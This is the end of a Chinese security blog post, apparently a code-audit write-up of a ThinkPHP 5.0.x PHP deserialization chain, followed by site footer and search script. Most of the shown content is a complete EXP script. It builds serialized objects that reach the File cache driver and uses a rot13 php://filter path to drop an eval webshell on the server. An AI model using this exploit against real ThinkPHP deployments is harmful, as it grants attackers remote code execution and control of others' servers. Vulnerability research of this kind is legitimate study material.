+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Windows</span>::<span class="title function_ invoke__">__destruct</span>()-&gt;<span class="title function_ invoke__">removeFiles</span>()</span><br><span class="line">↓</span><br><span class="line"><span class="title class_">Model</span>::<span class="title function_ invoke__">__toString</span>()-&gt;<span class="title function_ invoke__">toJson</span>()</span><br><span class="line">↓</span><br><span class="line"><span class="title class_">Model</span>::<span class="title function_ invoke__">tiJson</span>()-&gt;<span class="title function_ invoke__">toArray</span>()</span><br><span class="line">↓</span><br><span class="line"><span class="title class_">Model</span>::<span class="title function_ invoke__">toArrray</span>()-&gt;<span class="title function_ invoke__">getAttr</span>()</span><br><span class="line">↓</span><br><span class="line"><span class="title class_">Output</span>::<span class="title function_ invoke__">__call</span>()-&gt;<span class="title function_ invoke__">block</span>()</span><br><span class="line">↓</span><br><span class="line"><span class="title class_">Output</span>::<span class="title function_ invoke__">block</span>()-&gt;<span class="title function_ invoke__">writeln</span>()</span><br><span class="line">↓</span><br><span class="line"><span class="title class_">Output</span>::<span class="title function_ invoke__">writeln</span>()-&gt;<span class="title function_ invoke__">write</span>()</span><br><span class="line">↓</span><br><span class="line"><span class="title class_">Output</span>::<span class="title function_ invoke__">write</span>()-&gt;<span class="title function_ invoke__">write</span>()</span><br><span class="line">↓</span><br><span class="line"><span class="title class_">Memcached</span>::<span class="variable constant_">write</span>-&gt;<span class="title function_ invoke__">set</span>()</span><br><span class="line">↓</span><br><span class="line"><span class="title class_">File</span>::<span class="title function_ invoke__">set</span>()-&gt;<span class="title function_ invoke__">setTagItem</span>()</span><br><span class="line">↓</span><br><span class="line"><span class="title class_">Driver</span>::<span class="title function_ invoke__">setTagItem</span>()-&gt;<span class="title function_ invoke__">set</span>()</span><br></pre></td></tr></table></figure>
+<p>偷了一位师傅的图<br>
+非常详细<br>
+<img src="https://img-blog.csdnimg.cn/6cfaf3b523cb4b3080920924f6924c5d.png" alt="在这里插入图片描述"></p>
+<p>这里可能有些内容写的不是很详细<br>
+还请各位读者谅解</p>
+<h3 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;<span class="comment">#Relation</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;selfRelation = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">Query</span>();<span class="comment">#class Query</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>;<span class="comment">#OneToOne HasOne</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span> <span class="keyword">extends</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasOne</span> <span class="keyword">extends</span> <span class="title">OneToOne</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;bindAttr = [<span class="string">&quot;no&quot;</span>,<span class="string">&quot;123&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>;<span class="comment">#Output</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$styles</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">Memcached</span>();<span class="comment">//目的调用其write()</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;<span class="comment">#Model</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$parent</span>;<span class="comment">#修改处</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$aaaaa</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="keyword">new</span> <span class="title class_">Output</span>();<span class="comment">#Output对象,目的是调用__call()</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;getError&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;error = <span class="keyword">new</span> <span class="title class_">HasOne</span>();<span class="comment">//Relation子类,且有getBindAttr()</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;selfRelation = <span class="literal">false</span>;<span class="comment">//isSelfRelation()</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">Query</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span>;<span class="comment">#Query</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;model = <span class="keyword">new</span> <span class="title class_">Output</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>;<span class="comment">#Memcached</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">File</span>();<span class="comment">//目的调用File-&gt;set()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>;<span class="comment">#File</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$options</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;options = [</span><br><span class="line">        <span class="string">&#x27;expire&#x27;</span>        =&gt; <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;prefix&#x27;</span>        =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;path&#x27;</span>          =&gt; <span class="string">&#x27;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[q1ab])?&gt;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;tag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/07/27/%E4%BB%96%E4%BA%BA%E4%B8%8D%E5%90%88%E6%97%B6%E5%AE%9C%E7%9A%84%E5%AE%9A%E4%B9%89%EF%BC%8C%E4%B8%8D%E6%98%AF%E8%87%AA%E5%B7%B1%E7%9A%84%E8%BF%87%E9%94%99/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-07-29 01:19:17
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                        <b>#</b> 代码审计
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/thinkphp%E6%A1%86%E6%9E%B6/" title="thinkphp框架">
+                        <b>#</b> thinkphp框架
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/07/30/%E7%86%8A%E6%B5%B7CMS_V1.0-%E7%99%BD%E7%9B%92%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text"> 漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-text"> 过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text"> EXP</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/ki10Moc/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="ki10Moc1949@gmail.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=100083345720708">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/ki10moc1/status/1494844731544662019?s=21&t=l-0lygAzRMHeJeBklnPt-A">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">Copyright © 2025 ki10Moc</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">霍布斯鲍姆学徒 | CTFer</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + ThinkPHP5.0.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90 + '&url=' + https%3A%2F%2Fki10moc.github.io%2F2022%2F07%2F29%2FThinkPHP5.0.x%2520%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E5%2588%2586%25E6%259E%2590%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ki10moc.github.io/2022/07/29/ThinkPHP5.0.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
